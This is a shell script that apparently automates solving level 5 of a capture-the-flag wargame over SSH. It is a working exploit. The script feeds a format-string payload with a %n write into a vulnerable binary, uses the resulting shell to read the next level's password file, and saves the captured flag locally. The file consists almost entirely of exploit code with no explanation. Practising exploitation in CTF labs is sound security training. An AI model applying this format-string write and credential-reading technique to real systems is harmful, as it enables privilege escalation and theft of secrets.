#!/usr/bin/env sh

### GLOBALS ###

CURR_DIR_PATH="$(cd "$(dirname "$0")" && pwd)"

### SOURCES ###

. "$CURR_DIR_PATH/../../common/ssh/ssh_session.sh";
. "$CURR_DIR_PATH/.sshid.sh";

# ##### #
# UTILS #
# ##### #

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*";
}

# #### #
# MAIN #
# #### #

main() {
    flag="";

    log "Authenticating to SSH server at $host:$port with username '$username'...";
    SSHPASS="$(sshid_password)" ssh_initialize_socket "$host" "$port" "$username" || { log "Error: Failed to initialize SSH socket." >&2; return 1; };
    ssh_exec_via_socket "$host" "$port" "$username" "rm -f /tmp/flag.txt && touch /tmp/flag.txt";
    (
        printf '%s' 'cat '/home/user/level6/.pass' > /tmp/flag.txt;';
    ) | ssh_exec_via_socket "$host" "$port" "$username" '(printf "%b\n" "\070\230\004\010%134513824c%4\$n"; cat -) | ./level5 1>/dev/null';
    flag=$(ssh_exec_via_socket "$host" "$port" "$username" "cat /tmp/flag.txt && rm -f /tmp/flag.txt");
    ssh_destroy_socket "$host" "$port" "$username" || { log "Error: Failed to destroy SSH socket." >&2; return 1; };
    
    if [ -z "$flag" ]; then
        log "Error: flag is empty. Something went wrong.";
        return 1;
    fi

    flag_path="$CURR_DIR_PATH/../flag";
    log "Flag '$flag' has been written to '$flag_path'";
    echo -n "$flag" > "$flag_path";
}

main "$@";
